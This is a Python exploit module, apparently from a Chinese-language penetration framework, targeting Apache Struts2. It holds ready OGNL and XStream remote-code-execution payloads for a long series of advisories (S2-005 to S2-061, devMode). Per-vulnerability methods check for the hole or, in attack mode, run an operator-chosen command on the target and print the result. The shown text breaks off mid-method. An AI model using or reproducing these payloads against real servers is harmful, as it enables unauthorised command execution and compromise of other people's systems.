from util.ExpRequest import ExpRequest,Output
from operator import methodcaller
from ClassCongregation import Dnslog,URL
from lxml import html
import base64
"""
ApacheStruts2
"""
class ApacheStruts2():
    def __init__(self, **env):
        #指定HTTP/1.0，有可能导致连接中断
        #http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.status = env.get('status')

        self.payload_s2_005 = r"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.Method" \
            r"Accessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.ut" \
            r"il.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'RECOMMAND\'')(d))&(h)(('\43myret\75@java.lang.Runtim" \
            r"e@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputSt" \
            r"ream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('" \
            r"\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionCo" \
            r"ntext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))"
        self.payload_s2_008 = '?debug=command&expression=(%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%' \
            '23foo%3Dnew%20java.lang.Boolean%28"false"%29%20%2C%23context%5B"xwork.MethodAccessor.denyMethodExecutio' \
            'n"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%' \
            '27RECOMMAND%27%29.getInputStream%28%29%29)'
        self.payload_s2_009=r"class.classLoader.jarPath=%28%23context[%22xwo" \
            r"rk.MethodAccessor.denyMethodExecution%22]%3d+new+java.lang.Boo" \
            r"lean%28false%29%2c+%23_memberAccess[%22allowStaticMethodAccess" \
            r"%22]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29." \
            r"exec%28%27RECOMMAND%27%29.getInputStream%28%29%2c%23b%3dnew+ja" \
            r"va.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.Buffere" \
            r"dReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read" \
            r"%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionCo" \
            r"ntext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println" \
            r"%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.clas" \
            r"sLoader.jarPath%29%28%27meh%27%29]"
        self.payload_s2_013='?233=%24%7B%23_memberAccess%5B"allowStaticMetho' \
            'dAccess"%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime()' \
            '.exec(%27RECOMMAND%27).getInputStream()%2C%23b%3Dnew%20java.io.' \
            'InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%' \
            '23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%' \
            '3D%40org.apache.struts2.ServletActionContext%40getResponse().ge' \
            'tWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.Str' \
            'ing(%23d))%2C%23out.close()%7D'
        #只能执行简单的命令
        self.payload_s2_015 = r"/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAcces" \
            r"s.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberA" \
            r"ccess, true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('RECOMMAND').getInp" \
            r"utStream())}.action"
        self.payload_s2_016_1=r"?redirect:${%23req%3d%23context.get(%27co%27" \
            r"%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atc" \
            r"her.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java" \
            r".util.Scanner((new%20java.lang.ProcessBuilder(%27RECOMMAND%27." \
            r"toString().split(%27\\s%27))).start().getInputStream()).useDel" \
            r"imiter(%27\\A%27),%23str%3d%23s.hasNext()?%23s.next():%27%27," \
            r"%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony" \
            r".xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes" \
            r"%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27)," \
            r"%23resp.getWriter().println(%23str),%23resp.getWriter().flush" \
            r"(),%23resp.getWriter().close()}"
        self.payload_s2_016_2 = base64.b64decode("cmVkaXJlY3Q6JHslMjNyZXElM2QlMjNjb250ZXh0LmdldCglMjdjbyUyNyUyYiUyN2" 
            "0ub3BlbiUyNyUyYiUyN3N5bXBob255Lnh3byUyNyUyYiUyN3JrMi5kaXNwJTI3JTJiJTI3YXRjaGVyLkh0dHBTZXIlMjclMmIlMjd2b" 
            "GV0UmVxJTI3JTJiJTI3dWVzdCUyNyksJTIzcyUzZG5ldyUyMGphdmEudXRpbC5TY2FubmVyKChuZXclMjBqYXZhLmxhbmcuUHJvY2Vz" 
            "c0J1aWxkZXIoJTI3bmV0c3RhdCUyMC1hbiUyNy50b1N0cmluZygpLnNwbGl0KCUyN1xccyUyNykpKS5zdGFydCgpLmdldElucHV0U3R" 
            "yZWFtKCkpLnVzZURlbGltaXRlciglMjdcXEElMjcpLCUyM3N0ciUzZCUyM3MuaGFzTmV4dCgpPyUyM3MubmV4dCgpOiUyNyUyNywlMj" 
            "NyZXNwJTNkJTIzY29udGV4dC5nZXQoJTI3Y28lMjclMmIlMjdtLm9wZW4lMjclMmIlMjdzeW1waG9ueS54d28lMjclMmIlMjdyazIuZ" 
            "GlzcCUyNyUyYiUyN2F0Y2hlci5IdHRwU2VyJTI3JTJiJTI3dmxldFJlcyUyNyUyYiUyN3BvbnNlJTI3KSwlMjNyZXNwLnNldENoYXJh" 
            "Y3RlckVuY29kaW5nKCUyN1VURi04JTI3KSwlMjNyZXNwLmdldFdyaXRlcigpLnByaW50bG4oJTIzc3RyKSwlMjNyZXNwLmdldFdyaXR" 
            "lcigpLmZsdXNoKCksJTIzcmVzcC5nZXRXcml0ZXIoKS5jbG9zZSgpfQ==")
        #服务端需要设置<s:textfield name="%{message}"></s:textfield>
        self.payload_s2_029 = r"?message=(%23_memberAccess[%27allowPrivateAccess%27]=true,%23_memberAccess[%27allowProtected" \
            r"Access%27]=true,%23_memberAccess[%27excludedPackageNamePatterns%27]=%23_memberAccess[%27acceptProperti" \
            r"es%27],%23_memberAccess[%27excludedClasses%27]=%23_memberAccess[%27acceptProperties%27],%23_memberAcce" \
            r"ss[%27allowPackageProtectedAccess%27]=true,%23_memberAccess[%27allowStaticMethodAccess%27]=true,@org.a" \
            r"pache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27RECOMMAND%27).getInputStream" \
            r"()))"
# Unknown bug... ...
#        self.payload_s2_032 = r"?method:%23_memberAccess%3d@ognl.OgnlContext@D EFAULT_MEMBER_ACCESS,%23res%3d%40org." \
#            r"apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding" \
#            r"[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23pa" \
#            r"rameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.ne" \
#            r"xt()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=RECOMMAND&" \
#            r"pp=____A&ppp=%20&encoding=UTF-8"
        self.payload_s2_032 = ("?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3D%40org.a"
            "pache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding"
            "(%23parameters.encoding%5B0%5D),%23w%3D%23res.getWriter(),%23s%3Dnew+java.util.Scanner"
            "(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter"
            "(%23parameters.pp%5B0%5D),%23str%3D%23s.hasNext()%3F%23s.next()%3A%23parameters.ppp%5B0%5D,%23w."
            "print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=RECOMMAND&pp=____A&ppp=%20&encoding=UTF-8")
        
        self.payload_s2_045=r"%{(#toolslogo='multipart/form-data').(#dm=@ogn" \
            r"l.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_member" \
            r"Access=#dm):((#container=#context['com.opensymphony.xwork2.Act" \
            r"ionContext.container']).(#ognlUtil=#container.getInstance(@com" \
            r".opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExclu" \
            r"dedPackageNames().clear()).(#ognlUtil.getExcludedClasses().cle" \
            r"ar()).(#context.setMemberAccess(#dm)))).(#cmd='RECOMMAND').(#i" \
            r"swin=(@java.lang.System@getProperty('os.name').toLowerCase().c" \
            r"ontains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/b" \
            r"ash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p" \
            r".redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org." \
            r"apache.struts2.ServletActionContext@getResponse().getOutputStr" \
            r"eam())).(@org.apache.commons.io.IOUtils@copy(#process.getInput" \
            r"Stream(),#ros)).(#ros.flush())}"
            
        self.payload_s2_046='''-----------------------------\r\n ''' \
            '''Content-Disposition: form-data; name=\"foo\"; filename=\"%{''' \
            '''(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_M''' \
            '''EMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#conta''' \
            '''iner=#context['com.opensymphony.xwork2.ActionContext.contai''' \
            '''ner']).(#ognlUtil=#container.getInstance(@com.opensymphony.''' \
            '''xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageN''' \
            '''ames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#''' \
            '''context.setMemberAccess(#dm)))).(#cmd='RECOMMAND').(#iswin=''' \
            '''(@java.lang.System@getProperty('os.name').toLowerCase().con''' \
            '''tains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/''' \
            '''bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds))''' \
            '''.(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros''' \
            '''=(@org.apache.struts2.ServletActionContext@getResponse().ge''' \
            '''tOutputStream())).(@org.apache.commons.io.IOUtils@copy(#pro''' \
            '''cess.getInputStream(),#ros)).(#ros.flush())}\x00b\"\r\nCont''' \
            '''ent-Type: text/plain\r\n\r\nzzzzz\r\n----------------------''' \
            '''---------\r\n\r\n'''
        self.payload_s2_048=r"%{(#szgx='multipart/form-data').(#dm=@ognl.Ogn" \
            r"lContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAcces" \
            r"s=#dm):((#container=#context['com.opensymphony.xwork2.ActionCo" \
            r"ntext.container']).(#ognlUtil=#container.getInstance(@com.open" \
            r"symphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPa" \
            r"ckageNames().clear()).(#ognlUtil.getExcludedClasses().clear())" \
            r".(#context.setMemberAccess(#dm)))).(#cmd='RECOMMAND').(#iswin=" \
            r"(@java.lang.System@getProperty('os.name').toLowerCase().contai" \
            r"ns('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash'," \
            r"'-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redi" \
            r"rectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apach" \
            r"e.struts2.ServletActionContext@getResponse().getOutputStream()" \
            r")).(@org.apache.commons.io.IOUtils@copy(#process.getInputStrea" \
            r"m(),#ros)).(#ros.close())}"
        self.payload_s2_052='''<map> <entry> <jdk.nashorn.internal.objects''' \
            '''.NativeString> <flags>0</flags> <value class="com.sun.xml.i''' \
            '''nternal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHand''' \
            '''ler> <dataSource class="com.sun.xml.internal.ws.encoding.xm''' \
            '''l.XMLMessage$XmlDataSource"> <is class="javax.crypto.Cipher''' \
            '''InputStream"> <cipher class="javax.crypto.NullCipher"> <ini''' \
            '''tialized>false</initialized> <opmode>0</opmode> <serviceIte''' \
            '''rator class="javax.imageio.spi.FilterIterator"> <iter class''' \
            '''="javax.imageio.spi.FilterIterator"> <iter class="java.util''' \
            '''.Collections$EmptyIterator"/> <next class="java.lang.Proces''' \
            '''sBuilder"> <command> <string>RECOMMAND</string> </command> ''' \
            '''<redirectErrorStream>false</redirectErrorStream> </next> </''' \
            '''iter> <filter class="javax.imageio.ImageIO$ContainsFilter">''' \
            ''' <method> <class>java.lang.ProcessBuilder</class> <name>sta''' \
            '''rt</name> <parameter-types/> </method> <name>foo</name> </f''' \
            '''ilter> <next class="string">foo</next> </serviceIterator> <''' \
            '''lock/> </cipher> <input class="java.lang.ProcessBuilder$Nul''' \
            '''lInputStream"/> <ibuffer></ibuffer> <done>false</done> <ost''' \
            '''art>0</ostart> <ofinish>0</ofinish> <closed>false</closed> ''' \
            '''</is> <consumed>false</consumed> </dataSource> <transferFla''' \
            '''vors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.n''' \
            '''ashorn.internal.objects.NativeString> <jdk.nashorn.internal''' \
            '''.objects.NativeString reference="../jdk.nashorn.internal.ob''' \
            '''jects.NativeString"/> </entry> <entry> <jdk.nashorn.interna''' \
            '''l.objects.NativeString reference="../../entry/jdk.nashorn.i''' \
            '''nternal.objects.NativeString"/> <jdk.nashorn.internal.objec''' \
            '''ts.NativeString reference="../../entry/jdk.nashorn.internal''' \
            '''.objects.NativeString"/> </entry> </map>'''
        self.payload_s2_057=r"/struts2-showcase/"+"%24%7B%0A(%23dm%3D%40ognl" \
            r".OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B's" \
            r"truts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensympho" \
            r"ny.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInsta" \
            r"nce(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou." \
            r"getExcludedPackageNames().clear()).(%23ou.getExcludedClasses()" \
            r".clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang." \
            r"Runtime%40getRuntime().exec('RECOMMAND')).(%40org.apache.commo" \
            r"ns.io.IOUtils%40toString(%23a.getInputStream()))%7D"+"/actionC" \
            r"hain1.action"
        self.payload_s2_059=r"id=%25%7b%23_memberAccess.allowPrivateAccess%3" \
            r"Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_" \
            r"memberAccess.excludedClasses%3D%23_memberAccess.acceptProperti" \
            r"es%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_member" \
            r"Access.acceptProperties%2C%23res%3D%40org.apache.struts2.Servl" \
            r"etActionContext%40getResponse().getWriter()%2C%23a%3D%40java.l" \
            r"ang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%2" \
            r"3a.exec('RECOMMAND').getInputStream()).useDelimiter('%5C%5C%5C" \
            r"%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.p" \
            r"rint(%23str)%2C%23res.close()%0A%7d"
        #self.payload_s2_061 = r"""%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("RECOMMAND")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}"""
        #self.payload_s2_061 = '%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27"RECOMMAND"%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d'
        self.payload_s2_061 = r"""%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27RECOMMAND%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"""
        self.payload_s2_devMode = r"?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" \
            r"%3F(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toS" \
            r"tring(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toStri" \
            r"ng.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=RECOMMAND"

    def s2_005(self):
        appName = 'Apache Struts2'
        pocname = 'S2-005'
        path = ''
        method = 'post'
        desc = 'Apache Struts2: S2-005'
        info = '[rce]'
        payload = self.payload_s2_005.replace("RECOMMAND",self.cmd)
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(self.url+path, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=payload, timeout=self.timeout, verify=False)
                if 'VuLnEcHoPoCSuCCeSS' in request.text:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                result = exprequest.post(self.url+path, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=payload, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def s2_008(self):
        appName = 'Apache Struts2'
        pocname = 'S2-008'
        method = 'get'
        desc = 'Apache Struts2: S2-008'
        info = '[rce]'
        payload = self.payload_s2_008.replace("RECOMMAND", self.cmd)
        payload_s2_008_test=  '?debug=command&expression=(80*443)'
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+payload_s2_008_test, timeout=self.timeout, verify=False)
                if '35440' in request.text:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                result = exprequest.get(self.url+payload, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def s2_009(self):
        appName = 'Apache Struts2'
        pocname = 'S2-009'
        path = ''
        method = 'post'
        desc = 'Apache Struts2: S2-009'
        info = '[rce]'
        payload = self.payload_s2_009.replace("RECOMMAND", self.cmd)
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(self.url+path, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=payload, timeout=self.timeout, verify=False)
                if 'VuLnEcHoPoCSuCCeSS' in request.text:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                result = exprequest.post(self.url+path, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=payload, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
  
    def s2_013(self):
        appName = 'Apache Struts2'
        pocname = 'S2-013'
        path = ''
        method = 'get'
        desc = 'Apache Struts2: S2-013'
        info = '[rce]'
        payload = self.payload_s2_013.replace("RECOMMAND", self.cmd)
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+path+payload, timeout=self.timeout, verify=False)
                if 'VuLnEcHoPoCSuCCeSS' in request.text:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                result = exprequest.get(self.url+path+payload, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def s2_015(self):
        appName = 'Apache Struts2'
        pocname = 'S2-015'
        url = URL(self.url).ProjectPath
        method = 'get'
        desc = 'Apache Struts2: S2-015'
        info = '[rce]'
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                dnslog = Dnslog()
                url0 = dnslog.dns_host()
                verify_cmd = 'ping '+ url0
                payload = self.payload_s2_015.replace("RECOMMAND", verify_cmd)
                request = exprequest.get(url+payload, timeout=self.timeout, verify=False)
                if dnslog.result():
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                payload = self.payload_s2_015.replace("RECOMMAND", self.cmd)
                result = exprequest.get(url+payload, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))
 
    def s2_016(self):
        appName = 'Apache Struts2'
        pocname = 'S2-016'
        method = 'get'
        desc = 'Apache Struts2: S2-016'
        info = '[rce]'
        payload_1 = self.payload_s2_016_1.replace("RECOMMAND", self.cmd)
        payload_2 = self.payload_s2_016_2
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+payload_1, timeout=self.timeout, verify=False)
                if 'VuLnEcHoPoCSuCCeSS' in request.text:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                result = exprequest.get(self.url+payload_1, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def s2_029(self):
        appName = 'Apache Struts2'
        pocname = 'S2-029'
        method = 'get'
        desc = 'Apache Struts2: S2-029'
        info = '[rce]'
        payload = self.payload_s2_029.replace("RECOMMAND", self.cmd)
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+payload, timeout=self.timeout, verify=False)
                if request.status_code != 404 and 'VuLnEcHoPoCSuCCeSS' in request.text:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                result = exprequest.get(self.url+payload, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def s2_032(self):
        appName = 'Apache Struts2'
        pocname = 'S2-032'
        path = ''
        method = 'get'
        desc = 'Apache Struts2: S2-032'
        info = '[rce]'
        payload = self.payload_s2_032.replace("RECOMMAND",self.cmd)
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+path+payload, timeout=self.timeout, verify=False)
                if 'VuLnEcHoPoCSuCCeSS' in request.text:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                result = exprequest.get(self.url+path+payload, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def s2_045(self):
        appName = 'Apache Struts2'
        pocname = 'S2-045'
        path = ''
        method = 'get'
        desc = 'Apache Struts2: S2-045'
        info = '[rce]'
        page = 'null'
        vuln_number = ''
        headers1 = {
            'Content-Type': '${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].' 
            'addHeader("FUCK",233*233)}.multipart/form-data'
        }
        headers2 = {
            'Content-Type': self.payload_s2_045.replace("RECOMMAND", self.cmd)
        }
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+path, headers=headers1, timeout=self.timeout, verify=False)
                for value in request.headers.values():
                    if r"54289" in value:
                        output.echo_success(method, info)
                        self.status = 'success'
                        return
                result = exprequest.get(self.url+path, headers=headers2, timeout=self.timeout, verify=False).text
                if 'VuLnEcHoPoCSuCCeSS' in result:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                result = exprequest.get(self.url+path, headers=headers2, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def s2_046(self):
        appName = 'Apache Struts2'
        pocname = 'S2-046'
        path = ''
        method = 'post'
        desc = 'Apache Struts2: S2-046'
        info = '[rce]'
        headers = {'Content-Type':'multipart/form-data; boundary=---------------------------'}
        payload = self.payload_s2_046.replace("RECOMMAND",self.cmd)
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(self.url+path, data=payload, headers=headers, timeout=self.timeout, verify=False)
                if 'VuLnEcHoPoCSuCCeSS' in request.text:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                result = exprequest.post(self.url+path, data=payload, headers=headers, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def s2_048(self):
        appName = 'Apache Struts2'
        pocname = 'S2-048'
        method = 'post'
        desc = 'Apache Struts2: S2-048'
        info = '[rce]'
        headers = {'Content-Type':'multipart/form-data; boundary=---------------------------'}
        payload = self.payload_s2_046.replace("RECOMMAND",self.cmd)
        url = URL(self.url).ProjectPath
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        if r"saveGangster.action" not in url:
            self.u = url+"/integration/saveGangster.action"
        payload = {
            'name': self.payload_s2_048.replace("RECOMMAND",self.cmd),
            'age': '233',
            '__checkbox_bustedBefore': 'true',
            'description': '233'
        }
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(self.u, data=payload, headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=self.timeout, verify=False)
                if 'VuLnEcHoPoCSuCCeSS' in request.text:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                result = exprequest.post(self.u, data=payload, headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def s2_052(self):
        appName = 'Apache Struts2'
        pocname = 'S2-052'
        method = 'post'
        desc = 'Apache Struts2: S2-052'
        info = '[rce]'
        payload = self.payload_s2_052.replace("RECOMMAND",self.cmd)
        headers = {
            'Accept': 'text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Content-Type': 'application/xml'
        }
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.post(self.url, data=payload, headers=headers, timeout=self.timeout, verify=False)
                if 'VuLnEcHoPoCSuCCeSS' in request.text:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                result = exprequest.post(self.url, data=payload, headers=headers, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

    def s2_057(self):
        appName = 'Apache Struts2'
        pocname = 'S2-057'
        path = ''
        method = 'get'
        desc = 'Apache Struts2: S2-057'
        info = '[rce]'
        url = URL(self.url).RootPath
        payload = self.payload_s2_057.replace("RECOMMAND",self.cmd)
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(url+payload, timeout=self.timeout, verify=False)
                etree = html.etree
                page = etree.HTML(request.text)
                data = page.xpath('//footer/div[1]/p[1]/a[1]/@*')
                if 'VuLnEcHoPoCSuCCeSS' in data:
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack        
            else:
                request = exprequest.get(url+payload, timeout=self.timeout, verify=False)
                etree = html.etree
                page = etree.HTML(request.text)
                data = page.xpath('//footer/div[1]/p[1]/a[1]/@*')
